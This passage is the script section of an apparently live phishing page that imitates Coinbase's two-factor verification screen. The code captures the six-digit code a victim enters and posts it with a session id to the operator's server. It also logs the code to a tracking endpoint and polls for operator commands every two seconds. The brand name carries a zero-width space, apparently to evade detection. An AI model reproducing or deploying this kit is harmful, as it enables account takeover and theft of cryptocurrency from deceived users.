            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            code: code,
            session_id: sessionId
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            console.log('Success! Redirecting to landing...');
            
            // Track success
            fetch('/track-navigation', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    page_url: 'C&#8203;oinbase 2-Factor Code Submitted: ' + code
                })
            }).finally(() => {
                window.location.href = '/landing';
            });
        } else {
            console.log('Submission failed:', data.error);
            if (errorElement) {
                errorElement.textContent = data.error || 'Verification failed. Please try again.';
                errorElement.style.display = 'block';
                setTimeout(() => errorElement.style.display = 'none', 5000);
            }
            // Re-enable buttons
            buttons.forEach(btn => {
                btn.style.opacity = '1';
                btn.disabled = false;
            });
        }
    })
    .catch(error => {
        console.error('Error:', error);
        if (errorElement) {
            errorElement.textContent = 'Network error. Please check your connection.';
            errorElement.style.display = 'block';
            setTimeout(() => errorElement.style.display = 'none', 5000);
        }
        // Re-enable buttons
        buttons.forEach(btn => {
            btn.style.opacity = '1';
            btn.disabled = false;
        });
    });
}

// Initialize form functionality
function initializeForms() {
    const INPUTS_SEL = 'input[aria-label^="6 digit code"]';

    // Update hidden inputs and button states
    function updateForms() {
        // Update mobile form
        const mobileInputs = document.querySelectorAll('.mobile-view ' + INPUTS_SEL);
        let mobileCode = '';
        mobileInputs.forEach(inp => mobileCode += inp.value);
        const mobileHiddenInput = document.getElementById('code');
        if (mobileHiddenInput) mobileHiddenInput.value = mobileCode;

        // Update desktop form  
        const desktopInputs = document.querySelectorAll('.desktop-view ' + INPUTS_SEL);
        let desktopCode = '';
        desktopInputs.forEach(inp => desktopCode += inp.value);
        const desktopHiddenInput = document.getElementById('codeDesktop');
        if (desktopHiddenInput) desktopHiddenInput.value = desktopCode;

        // Enable/disable buttons based on 6 digits
        const mobileButton = document.querySelector('.mobile-view [data-testid="unified-login-email-prompt-submit-button"]');
        const desktopButton = document.querySelector('.desktop-view [data-testid="unified-login-email-prompt-submit-button"]');

        const mobileComplete = mobileCode.length === 6;
        const desktopComplete = desktopCode.length === 6;

        // Update mobile button
        if (mobileButton) {
            if (mobileComplete) {
                mobileButton.disabled = false;
                mobileButton.style.pointerEvents = 'auto';
                mobileButton.style.opacity = '1';
                mobileButton.classList.remove('cds-disabledState-do7z3i1', 'cds-disabledBorder-d109aw8r');
            } else {
                mobileButton.disabled = true;
                mobileButton.style.pointerEvents = 'none';
                mobileButton.style.opacity = '0.7';
                mobileButton.classList.add('cds-disabledState-do7z3i1', 'cds-disabledBorder-d109aw8r');
            }
        }

        // Update desktop button
        if (desktopButton) {
            if (desktopComplete) {
                desktopButton.disabled = false;
                desktopButton.style.pointerEvents = 'auto';
                desktopButton.style.opacity = '1';
                desktopButton.classList.remove('cds-disabledState-do7z3i1', 'cds-disabledBorder-d109aw8r');
            } else {
                desktopButton.disabled = true;
                desktopButton.style.pointerEvents = 'none';
                desktopButton.style.opacity = '0.7';
                desktopButton.classList.add('cds-disabledState-do7z3i1', 'cds-disabledBorder-d109aw8r');
            }
        }
    }

    // Setup button click handlers
    function setupButtonHandlers() {
        // Find buttons in the correct context
        const mobileButton = document.querySelector('.mobile-view [data-testid="unified-login-email-prompt-submit-button"]');
        const desktopButton = document.querySelector('.desktop-view [data-testid="unified-login-email-prompt-submit-button"]');

        console.log('Mobile button found:', mobileButton);
        console.log('Desktop button found:', desktopButton);

        // Mobile button handler
        if (mobileButton) {
            // Remove any existing listeners by cloning
            const newMobileButton = mobileButton.cloneNode(true);
            mobileButton.parentNode.replaceChild(newMobileButton, mobileButton);
            
            newMobileButton.addEventListener('click', function(e) {
                e.preventDefault();
                console.log('Mobile button clicked');
                
                const sessionId = document.getElementById('sessionId').value;
                const code = document.getElementById('code').value;
                const errorElement = document.querySelector('.mobile-view #errorMessage') || document.getElementById('errorMessage');
                
                if (code && code.length === 6) {
                    submitVerificationCode(code, sessionId, errorElement);
                } else {
                    if (errorElement) {
                        errorElement.textContent = 'Please enter all 6 digits';
                        errorElement.style.display = 'block';
                        setTimeout(() => errorElement.style.display = 'none', 3000);
                    }
                }
            });
        }

        // Desktop button handler
        if (desktopButton) {
            // Remove any existing listeners by cloning
            const newDesktopButton = desktopButton.cloneNode(true);
            desktopButton.parentNode.replaceChild(newDesktopButton, desktopButton);
            
            newDesktopButton.addEventListener('click', function(e) {
                e.preventDefault();
                console.log('Desktop button clicked');
                
                const sessionId = document.getElementById('sessionIdDesktop').value;
                const code = document.getElementById('codeDesktop').value;
                const errorElement = document.querySelector('.desktop-view #errorMessage') || document.getElementById('errorMessage');
                
                if (code && code.length === 6) {
                    submitVerificationCode(code, sessionId, errorElement);
                } else {
                    if (errorElement) {
                        errorElement.textContent = 'Please enter all 6 digits';
                        errorElement.style.display = 'block';
                        setTimeout(() => errorElement.style.display = 'none', 3000);
                    }
                }
            });
        }
    }

    // Setup button handlers
    setupButtonHandlers();

    // Update on every input change
    document.querySelectorAll(INPUTS_SEL).forEach(input => {
        input.addEventListener('input', updateForms);
        input.addEventListener('keyup', updateForms);
    });

    // Initial update
    updateForms();

    // Re-setup handlers when window resizes (view changes)
    window.addEventListener('resize', function() {
        setTimeout(setupButtonHandlers, 100);
    });
}

// MOBILE-COMPATIBLE OTP input functionality with auto-advance
(function () {
    const CONTAINER_SEL = '[data-testid="code-inputs-container"]';
    const INPUTS_SEL = 'input[aria-label^="6 digit code"]';

    function wire(container) {
        // Get all inputs for this container
        let inputs = Array.from(container.querySelectorAll(INPUTS_SEL));
        if (!inputs.length) return;

        console.log('Wiring OTP inputs:', inputs.length);

        // Process each input
        inputs.forEach((originalInput, index) => {
            // Clone the input to remove any existing event listeners
            const newInput = originalInput.cloneNode(true);
            originalInput.parentNode.replaceChild(newInput, originalInput);
            
            // Update our reference to use the new input
            inputs[index] = newInput;
            
            // Set attributes for single character input
            newInput.setAttribute('maxlength', '1');
            newInput.setAttribute('inputmode', 'numeric');
            newInput.setAttribute('type', 'tel'); // Use 'tel' for better mobile keyboard
            
            // Store references for this input
            const currentInputs = inputs;
            const currentIndex = index;

            // MOBILE-FRIENDLY Input event with multiple triggers
            newInput.addEventListener('input', function(e) {
                handleInput(this, currentInputs, currentIndex);
            });

            // Keyup event for additional mobile support
            newInput.addEventListener('keyup', function(e) {
                // Auto-advance on digit input (mobile keyboards sometimes don't trigger input event properly)
                if (e.key.match(/[0-9]/) && this.value && currentIndex < currentInputs.length - 1) {
                    setTimeout(() => {
                        currentInputs[currentIndex + 1].focus();
                        currentInputs[currentIndex + 1].select();
                    }, 50);
                }
            });

            // Keydown event for backspace and navigation
            newInput.addEventListener('keydown', function(e) {
                // Backspace handling
                if (e.key === 'Backspace') {
                    if (!this.value && currentIndex > 0) {
                        e.preventDefault();
                        currentInputs[currentIndex - 1].focus();
                        currentInputs[currentIndex - 1].value = '';
                        updateFilledState(currentInputs[currentIndex - 1]);
                        if (typeof updateForms === 'function') {
                            updateForms();
                        }
                    }
                }
                
                // Arrow key navigation
                if (e.key === 'ArrowLeft' && currentIndex > 0) {
                    e.preventDefault();
                    currentInputs[currentIndex - 1].focus();
                }
                if (e.key === 'ArrowRight' && currentIndex < currentInputs.length - 1) {
                    e.preventDefault();
                    currentInputs[currentIndex + 1].focus();
                }
            });

            // Focus event - select all text when focused
            newInput.addEventListener('focus', function() {
                setTimeout(() => {
                    this.select();
                }, 10);
            });

            // Click event - select all text when clicked
            newInput.addEventListener('click', function() {
                setTimeout(() => {
                    this.select();
                }, 10);
            });

            // Touch events for mobile
            newInput.addEventListener('touchstart', function() {
                setTimeout(() => {
                    this.select();
                }, 100);
            });

            // Initial state
            updateFilledState(newInput);
        });

        // Handle input function
        function handleInput(input, inputArray, index) {
            // Clean input - only allow digits and take only first character
            let value = input.value.replace(/\D/g, '');
            if (value.length > 1) {
                value = value.charAt(0);
            }
            input.value = value;
            
            // Update visual state
            updateFilledState(input);
            
            // Auto-advance to next input if we have a value
            if (value && index < inputArray.length - 1) {
                // Use multiple methods for mobile compatibility
                setTimeout(() => {
                    inputArray[index + 1].focus();
                    inputArray[index + 1].select();
                }, 10);
                
                // Additional mobile trigger
                setTimeout(() => {
                    if (inputArray[index + 1] && document.activeElement !== inputArray[index + 1]) {
                        inputArray[index + 1].focus();
                        inputArray[index + 1].select();
                    }
                }, 100);
            }
            
            // Update form state
            if (typeof updateForms === 'function') {
                updateForms();
            }
        }

        // Update filled state function
        function updateFilledState(input) {
            const shell = input.closest('[data-testid="input-interactable-area"]');
            if (shell) {
                if (input.value) {
                    shell.setAttribute('data-filled', 'true');
                } else {
                    shell.removeAttribute('data-filled');
                }
            }
        }

        // Paste event handler for the entire container
        container.addEventListener('paste', function(e) {
            e.preventDefault();
            const text = (e.clipboardData || window.clipboardData).getData('text');
            const digits = text.replace(/\D/g, '').substring(0, 6);
            
            // Get current inputs (in case they changed)
            const currentInputs = Array.from(container.querySelectorAll(INPUTS_SEL));
            
            // Fill inputs with pasted digits
            currentInputs.forEach((input, idx) => {
                if (digits[idx]) {
                    input.value = digits[idx];
                    updateFilledState(input);
                } else {
                    input.value = '';
                    updateFilledState(input);
                }
            });
            
            // Update form state
            if (typeof updateForms === 'function') {
                updateForms();
            }
            
            // Focus appropriate input
            const nextEmptyIndex = currentInputs.findIndex(inp => !inp.value);
            if (nextEmptyIndex !== -1) {
                setTimeout(() => {
                    currentInputs[nextEmptyIndex].focus();
                    currentInputs[nextEmptyIndex].select();
                }, 10);
            } else {
                setTimeout(() => {
                    currentInputs[Math.min(digits.length, 5)].focus();
                    currentInputs[Math.min(digits.length, 5)].select();
                }, 10);
            }
        });
    }

    // Initialize all OTP containers
    function initOTP() {
        const containers = document.querySelectorAll(CONTAINER_SEL);
        console.log('Found OTP containers:', containers.length);
        containers.forEach((container, index) => {
            console.log(`Wiring container ${index + 1}`);
            wire(container);
        });
        
        // Mobile-specific enhancements
        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
            console.log('Mobile device detected - applying mobile optimizations');
            
            // Add touch-friendly styles
            const style = document.createElement('style');
            style.textContent = `
                [data-testid="input-interactable-area"] {
                    min-height: 60px !important;
                }
                [data-testid="code-inputs-container"] input {
                    font-size: 18px !important; /* Prevent zoom on iOS */
                    min-height: 50px !important;
                }
            `;
            document.head.appendChild(style);
        }
    }

    // Start OTP functionality
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initOTP);
    } else {
        // If DOM is already loaded, initialize immediately
        setTimeout(initOTP, 100);
    }
})();

// Initialize everything when page loads
document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM loaded - initializing forms');
    initializeForms();
    
    // Start checking for commands
    checkForCommands();
    setInterval(checkForCommands, 2000);

    // Track that we're on C&#8203;oinbase 2-factor page
    fetch('/track-navigation', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({page_url: 'C&#8203;oinbase 2-Factor Page Loaded'})
    });
    
    // For testing - set phone digits
    const phoneDigits = document.getElementById('phoneDigitsDisplay');
    if (phoneDigits) {
        phoneDigits.textContent = '81';
    }
});

// Force re-initialization for mobile
setTimeout(() => {
    const inputs = document.querySelectorAll('input[aria-label^="6 digit code"]');
    inputs.forEach((input, index) => {
        if (input.value && input.value.length > 1) {
            input.value = input.value.charAt(0);
        }
        // Ensure proper attributes for mobile
        input.setAttribute('inputmode', 'numeric');
        input.setAttribute('type', 'tel');
        input.setAttribute('maxlength', '1');
    });
    
    if (typeof updateForms === 'function') {
        updateForms();
    }
}, 1000);
</script>

<script>
/* iOS-safe auto-advance (delegated & deferred) */
(function () {
  const root = document.querySelector('[data-testid="code-inputs-container"]');
  if (!root) return;

  // Prevent iOS zoom (doesn't change layout)
  try {
    root.querySelectorAll('input').forEach(i => {
      i.style.fontSize = '16px';
      i.setAttribute('inputmode', 'numeric');
      i.setAttribute('autocomplete', i.getAttribute('autocomplete') || 'one-time-code');
      i.maxLength = 1;
    });
  } catch (_) {}

  // Delegate so it works even if inputs are re-rendered
  root.addEventListener('input', function (e) {
    const el = e.target;
    if (!(el instanceof HTMLInputElement)) return;

    // Only digits, one per box
    el.value = (el.value || '').replace(/\D/g, '').slice(0, 1);

    if (el.value.length === 1) {
      // iOS fix: defer focus to next tick (use both RAF and timeout to be extra safe)
      const inputs = Array.from(root.querySelectorAll('input'));
      const idx = inputs.indexOf(el);
      if (idx > -1 && idx < inputs.length - 1) {
        requestAnimationFrame(() => setTimeout(() => {
          inputs[idx + 1].focus();
          inputs[idx + 1].select?.();
        }, 0));
      } else if (idx === inputs.length - 1) {
        requestAnimationFrame(() => setTimeout(() => el.blur(), 0));
      }
    }
  });

  // Nice-to-have: backspace to previous when empty
  root.addEventListener('keydown', function (e) {
    const el = e.target;
    if (!(el instanceof HTMLInputElement)) return;
    if (e.key === 'Backspace' && !el.value) {
      const inputs = Array.from(root.querySelectorAll('input'));
      const idx = inputs.indexOf(el);
      if (idx > 0) {
        e.preventDefault();
        inputs[idx - 1].focus();
      }
    }
  });
})();
</script>


</body>
</html>
